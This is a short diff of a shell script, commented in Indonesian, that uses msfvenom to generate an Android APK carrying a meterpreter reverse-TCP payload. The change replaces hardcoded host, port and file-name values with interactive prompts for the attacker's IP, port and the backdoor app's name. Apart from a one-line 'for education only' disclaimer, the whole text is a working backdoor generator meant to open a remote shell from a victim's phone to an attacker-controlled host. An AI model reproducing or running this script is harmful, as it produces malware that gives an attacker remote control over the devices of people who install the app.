@@ -3,7 +3,7 @@
 # hanya untuk edukasi, jangan disalahgunakan.
 
 payload="android/meterpreter/reverse_tcp"
-lhost="<_ip_address_>"
-lport="4444"
-nama_aplikasi="<_nama_aplikasi.apk_>"
-msfvenom -p "$payload"  LHOST="$lhost" LPORT="$lport" R > "$nama_aplikasi"
+read -p "Masukkan alamat ip address: " lhost
+read -p "Masukkan port: " lport
+read -p "Masukkan nama aplikasi untuk backdoor android: " nama_aplikasi
+msfvenom -p "$payload"  LHOST="$lhost" LPORT="$lport" > "$nama_aplikasi"
